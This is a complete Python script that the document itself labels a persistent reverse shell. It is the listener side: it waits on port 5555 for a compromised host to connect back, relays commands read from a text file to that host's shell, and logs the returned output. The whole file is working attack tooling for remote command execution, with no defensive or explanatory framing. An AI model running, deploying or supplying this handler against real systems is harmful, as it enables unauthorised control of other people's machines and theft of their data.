#!/usr/bin/env python3
"""Persistent reverse shell: read commands from cmds.txt, write output to out.txt."""
import socket
import threading
import sys
import time
import os

HERE = os.path.dirname(os.path.abspath(__file__))
PORT = 5555
CMD_FILE = os.path.join(HERE, "shell_cmds.txt")
OUT_FILE = os.path.join(HERE, "shell_out.txt")

open(CMD_FILE, "w").close()
open(OUT_FILE, "wb").write(b"")

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", PORT))
s.listen(1)
print(f"[*] listen {PORT}", flush=True)
c, a = s.accept()
print(f"[+] connected {a}", flush=True)
open(os.path.join(HERE, "shell_ready.flag"), "w").write("1")


def recv():
    with open(OUT_FILE, "ab") as f:
        while True:
            try:
                d = c.recv(8192)
            except Exception:
                break
            if not d:
                break
            f.write(d)
            f.flush()
            sys.stdout.buffer.write(d)
            sys.stdout.flush()


threading.Thread(target=recv, daemon=True).start()
pos = 0
while True:
    try:
        data = open(CMD_FILE, "r", encoding="utf-8", errors="ignore").read()
    except Exception:
        time.sleep(0.3)
        continue
    if len(data) > pos:
        chunk = data[pos:]
        pos = len(data)
        for line in chunk.splitlines():
            line = line.strip("\r")
            if not line or line.startswith("#"):
                continue
            print(f"\n>>> {line}", flush=True)
            try:
                c.send((line + "\n").encode())
            except Exception as e:
                print("send err", e, flush=True)
                raise SystemExit(1)
            time.sleep(0.2)
    time.sleep(0.4)
